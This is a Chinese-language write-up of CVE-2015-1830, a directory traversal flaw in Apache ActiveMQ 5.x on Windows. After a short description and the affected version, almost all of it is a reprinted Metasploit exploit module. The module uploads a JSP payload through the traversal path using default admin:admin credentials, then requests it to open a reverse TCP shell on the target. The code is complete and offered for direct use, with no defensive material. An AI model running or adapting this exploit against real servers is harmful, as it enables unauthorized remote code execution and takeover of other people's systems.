<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce</h1><h2>一、漏洞简介</h2><p>Windows 5.11.2之前的Apache ActiveMQ 5.x中blob消息的文件服务器上载/下载功能中的目录遍历漏洞允许远程攻击者通过未指定的向量在任意目录中创建JSP文件。</p><h2>二、漏洞影响</h2><p>ActiveMQ 5.11.1</p><h2>三、复现过程</h2><h3>msf poc</h3><p>直接在msf里面搜索就行了，如果没有请更新msf版本，或者手动复制下面的脚本到msf目录下。</p><p>##<br /># This module requires Metasploit: https://metasploit.com/download<br /># Current source: https://github.com/rapid7/metasploit-framework<br />##<br /><br />class MetasploitModule &lt; Msf::Exploit::Remote<br />  Rank = ExcellentRanking<br /><br />  include Msf::Exploit::Remote::HttpClient<br /><br />  def initialize(info = {})<br />    super(update_info(info,<br />      'Name'           =&gt; 'Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload',<br />      'Description'    =&gt; %q{<br />        This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache<br />        ActiveMQ 5.x before 5.11.2 for Windows.<br /><br />        The module tries to upload a JSP payload to the /admin directory via the traversal<br />        path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ<br />        credentials admin:admin (or other credentials provided by the user). It then issues<br />        an HTTP GET request to /admin/&lt;payload&gt;.jsp on the target in order to trigger the<br />        payload and obtain a shell.<br />      },<br />      'Author'          =&gt;<br />        [<br />          'David Jorm',     # Discovery and exploit<br />          'Erik Wynter'     # @wyntererik - Metasploit<br />        ],<br />      'References'     =&gt;<br />        [<br />          [ 'CVE', '2015-1830' ],<br />          [ 'EDB', '40857'],<br />          [ 'URL', 'https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt' ]<br />        ],<br />      'Privileged'     =&gt; false,<br />      'Platform'    =&gt; %w{ win },<br />      'Targets'     =&gt;<br />        [<br />          [ 'Windows Java',<br />            {<br />              'Arch' =&gt; ARCH_JAVA,<br />              'Platform' =&gt; 'win'<br />            }<br />          ],<br />        ],<br />      'DisclosureDate' =&gt; '2015-08-19',<br />      'License'        =&gt; MSF_LICENSE,<br />      'DefaultOptions'  =&gt; {<br />        'RPORT' =&gt; 8161,<br />        'PAYLOAD' =&gt; 'java/jsp_shell_reverse_tcp'<br />        },<br />      'DefaultTarget'  =&gt; 0))<br /><br />    register_options([<br />      OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),<br />      OptString.new('PATH',      [true, 'Traversal path', '/fileserver/..\\admin\\']),<br />      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),<br />      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'admin'])<br />    ])<br />  end<br /><br />  def check<br />    print_status("Running check...")<br />    testfile = Rex::Text::rand_text_alpha(10)<br />    testcontent = Rex::Text::rand_text_alpha(10)<br /><br />    send_request_cgi({<br />      'uri'       =&gt; normalize_uri(target_uri.path, datastore['PATH'], &quot;#{testfile}.jsp&quot;),<br />      'headers'     =&gt; {<br />        'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])<br />        },<br />      'method'    =&gt; 'PUT',<br />      'data'      =&gt; &quot;&lt;% out.println(\&quot;#{testcontent}\&quot;);%&gt;&quot;<br />    })<br /><br />    res1 = send_request_cgi({<br />      'uri'       =&gt; normalize_uri(target_uri.path,&quot;admin/#{testfile}.jsp&quot;),<br />      'headers'     =&gt; {<br />        'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])<br />        },<br />      'method'    =&gt; 'GET'<br />    })<br /><br />    if res1 &amp;&amp; res1.body.include?(testcontent)<br />      send_request_cgi(<br />        opts = {<br />          'uri'       =&gt; normalize_uri(target_uri.path,&quot;admin/#{testfile}.jsp&quot;),<br />          'headers'     =&gt; {<br />            'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])<br />            },<br />          'method'    =&gt; 'DELETE'<br />        },<br />        timeout = 1<br />      )<br />      return Exploit::CheckCode::Vulnerable<br />    end<br /><br />    Exploit::CheckCode::Safe<br />  end<br /><br />  def exploit<br />    print_status("Uploading payload...")<br />    testfile = Rex::Text::rand_text_alpha(10)<br />    vprint_status("If upload succeeds, payload will be available at #{target_uri.path}admin/#{testfile}.jsp") #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.<br /><br />    send_request_cgi({<br />      'uri'       =&gt; normalize_uri(target_uri.path, datastore['PATH'], &quot;#{testfile}.jsp&quot;),<br />      'headers'     =&gt; {<br />        'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])<br />        },<br />      'method'    =&gt; 'PUT',<br />      'data'      =&gt; payload.encoded<br />    })<br /><br />    print_status("Payload sent. Attempting to execute the payload.")<br />    res = send_request_cgi({<br />      'uri'       =&gt; normalize_uri(target_uri.path,&quot;admin/#{testfile}.jsp&quot;),<br />      'headers'     =&gt; {<br />        'Authorization' =&gt; basic_auth(datastore['USERNAME'], datastore['PASSWORD'])<br />      },<br />      'method'    =&gt; 'GET'<br />    })<br />    if res &amp;&amp; res.code == 200<br />      print_good("Payload executed!")<br />    else<br />      fail_with(Failure::PayloadFailed, "Failed to execute the payload")<br />    end<br />  end<br />end</p></body></html>